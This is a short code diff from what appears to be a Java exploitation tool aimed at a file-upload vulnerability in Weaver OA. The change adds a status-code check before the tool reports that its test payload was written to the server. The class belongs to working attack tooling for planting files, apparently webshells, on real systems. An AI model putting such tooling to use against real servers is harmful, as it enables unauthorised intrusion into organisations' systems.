@@ -71,7 +71,7 @@ public class weaveroa_workrelate_uploadOperation implements Exploitlnterface {
                 });
                 Response thired = HttpTools.get(url + "/" + filename, new HashMap<String, String>(), "utf-8");
 
-                if (thired.getText().contains(shell.test_payload)) {
+                if (thired.getCode() == 200 && thired.getText().contains(shell.test_payload)) {
                     Platform.runLater(() -> {
                         textArea.appendText("\n 漏洞存在，测试文件写入成功 \n " + url + "/" + filename);
                     });
